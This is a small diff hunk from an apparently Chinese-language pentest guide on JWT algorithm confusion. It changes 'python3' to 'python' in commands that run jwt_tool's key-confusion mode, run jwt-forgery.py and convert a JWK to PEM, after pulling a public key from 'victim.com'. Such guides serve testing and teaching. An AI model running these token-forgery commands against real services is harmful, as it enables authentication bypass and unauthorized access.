@@ -291,13 +291,13 @@ openssl s_client -connect victim.com:443 2>/dev/null | openssl x509 -pubkey -noo
 
 ```bash
 # jwt_tool 算法混淆检测
-python3 jwt_tool.py <token> -X k -pk public.pem
+python jwt_tool.py <token> -X k -pk public.pem
 
 # PortSwigger 的 jwt-forgery.py
-python3 jwt-forgery.py <token> <public_key_or_jwks_url>
+python jwt-forgery.py <token> <public_key_or_jwks_url>
 
 # jwk_to_pem 转换
-python3 -c "
+python -c "
 from jwt.algorithms import RSAAlgorithm
 key = RSAAlgorithm.from_jwk(open('jwk.json').read())
 print(key.export_key().decode())
